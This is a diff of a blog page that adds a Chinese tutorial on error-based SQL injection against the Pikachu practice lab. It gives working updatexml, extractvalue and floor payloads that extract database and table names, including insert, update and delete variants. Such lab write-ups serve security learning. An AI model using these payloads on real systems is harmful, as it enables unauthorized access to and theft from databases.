@@ -29,13 +29,20 @@
 <meta property="og:site_name" content="Pumpkin-Man">
 <meta property="og:description" content="Pikachu靶场之SQL注入-基于报错的注入">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/28/0Acg9e.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/28/0Ac6hD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/28/0A2SsA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/28/0A2XT0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/28/0AR4BR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/28/0A4vz8.png">
 <meta property="article:published_time" content="2020-09-26T04:34:16.000Z">
-<meta property="article:modified_time" content="2020-09-24T12:27:59.496Z">
+<meta property="article:modified_time" content="2020-09-28T02:17:51.909Z">
 <meta property="article:author" content="Adge">
 <meta property="article:tag" content="靶场 SQL注入">
 <meta property="article:tag" content="Pikachu">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/09/28/0Acg9e.png">
 
 <link rel="canonical" href="https://lawadge.github.io/2020/09/26/pikachu%E9%9D%B6%E5%9C%BA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5/">
 
@@ -205,7 +212,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-24 20:27:59" itemprop="dateModified" datetime="2020-09-24T20:27:59+08:00">2020-09-24</time>
+                <time title="修改时间：2020-09-28 10:17:51" itemprop="dateModified" datetime="2020-09-28T10:17:51+08:00">2020-09-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -230,7 +237,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>24</span>
+              <span>1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -251,7 +258,67 @@
 
       
         <h1 id="Pikachu靶场之SQL注入-基于报错的注入"><a href="#Pikachu靶场之SQL注入-基于报错的注入" class="headerlink" title="Pikachu靶场之SQL注入-基于报错的注入"></a>Pikachu靶场之SQL注入-基于报错的注入</h1><ul>
-<li>​</li>
+<li><p>报错注入：利用插入函数中错误的语法来进行报错，从而将想要的信息提取出来。</p>
+<ul>
+<li>需要条件：后端并没有将数据库报错信息给屏蔽或者将报错页面进行一个错误页面调转，导致语法错误时，一些重要信息会被显示在前端。</li>
+</ul>
+</li>
+<li><p><code>updatexml()</code>：函数是 Mysql 对 XML 文档数据进行查询和修改的 Xpath 函数 </p>
+<ul>
+<li><p>函数语法：<code>updatexml(xml_document,XPathstring,new_vale)</code> 有三个参数</p>
+</li>
+<li><p><code>updatexml</code>函数报错的关键在于XPathstring参数，xpath定位必须是有效的，否则将会发生错误</p>
+</li>
+<li><p>下面用Pikachu平台进行测试验证</p>
+<ul>
+<li><p>Payload：<code>LawAdge&#39; AND updatexml(1,concat(0x7e,database()),0)#</code> 获取数据库名称</p>
+<p><img src="https://s1.ax1x.com/2020/09/28/0Acg9e.png" alt="0Acg9e.png"></p>
+</li>
+<li><p>Payload：<code>LawAdge&#39; AND updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1)),0)#</code>获取表名</p>
+<p><img src="https://s1.ax1x.com/2020/09/28/0Ac6hD.png" alt="0Ac6hD.png"></p>
+</li>
+</ul>
+</li>
+<li><p>在insert/update下测试</p>
+<ul>
+<li><p>Payload：<code>LawAdge&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</code></p>
+<p><img src="https://s1.ax1x.com/2020/09/28/0A2SsA.png" alt="0A2SsA.png"></p>
+</li>
+</ul>
+</li>
+<li><p>在delect注入下测试</p>
+<ul>
+<li><p>抓取post包 插入payload</p>
+</li>
+<li><p>Payload：<code>1 or updatexml(1,concat(0x7e,database()),0)</code> 需要url编码</p>
+<p><img src="https://s1.ax1x.com/2020/09/28/0A2XT0.png" alt="0A2XT0.png"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>extractvalue()`：同 updatexml 一样</p>
+<ul>
+<li><p>语法格式：<code>ExtractValue(Xml_domucent,XPath_string)</code> 有两个参数</p>
+</li>
+<li><p>原理跟<code>updatexml</code>函数差不多 报错的关键在于XPathstring参数，xpath定位必须是有效的，否则将会发生错误</p>
+<ul>
+<li><p>Payload：<code>LawAdge&#39; and extractvalue(1,concat(0x7e,database()))#</code></p>
+<p><img src="https://s1.ax1x.com/2020/09/28/0AR4BR.png" alt="0AR4BR.png"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>floor()</code>: Mysql 中用来取整的函数</p>
+</li>
+<li><p>floor原理可以参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/8472323.html">此文</a></p>
+<ul>
+<li><p>Payload：<code>LawAdge&#39; or (select 2 from (select count(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></p>
+<p><img src="https://s1.ax1x.com/2020/09/28/0A4vz8.png" alt="0A4vz8.png"></p>
+</li>
+</ul>
+</li>
 </ul>
 
     </div>
@@ -445,13 +512,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">19k</span>
+    <span title="站点总字数">20k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">17 分钟</span>
+    <span title="站点阅读时长">18 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
